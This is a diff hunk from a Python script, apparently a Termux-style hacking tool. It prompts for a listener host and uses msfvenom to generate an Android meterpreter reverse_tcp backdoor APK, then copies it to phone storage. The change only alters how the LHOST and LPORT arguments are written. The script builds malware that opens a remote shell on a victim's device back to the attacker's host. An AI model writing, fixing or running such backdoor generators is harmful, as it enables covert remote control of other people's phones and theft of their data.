@@ -268,7 +268,7 @@ def baru():
     lh=raw_input("lhost : ")
     os.system('clear')
     print hijau+"[*] GENERATE BACKDOOR \n"
-    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
+    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST "+lh+" LPORT "+port+" -o "+name+".apk")
     time.sleep(4)
     os.system('mv '+str(name)+'.apk /storage/emulated/0/')
     time.sleep(4)
